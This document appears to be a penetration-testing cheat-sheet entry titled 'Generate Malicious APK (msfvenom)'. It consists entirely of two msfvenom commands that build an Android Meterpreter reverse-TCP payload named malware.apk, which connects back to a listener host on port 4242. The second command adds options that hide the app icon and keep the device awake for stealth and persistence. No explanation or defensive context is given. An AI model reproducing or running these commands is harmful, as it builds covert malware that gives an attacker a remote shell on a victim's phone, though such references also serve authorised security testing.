---
title: Generate Malicious APK (msfvenom)
category: android
subcategory: sub-10
os: linux
command: msfvenom -p android/meterpreter/reverse_tcp
tools: msfvenom
---


### Basic payload

```bash
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=192.168.1.16 LPORT=4242 \
  -f raw -o malware.apk \
  --platform android
```

### With options

```bash
msfvenom -p android/meterpreter/reverse_tcp \
  AndroidHideAppIcon=true \
  AndroidWakeLock=true \
  LHOST=192.168.1.16 LPORT=4242 \
  -f raw -o malware.apk \
  --platform android
```
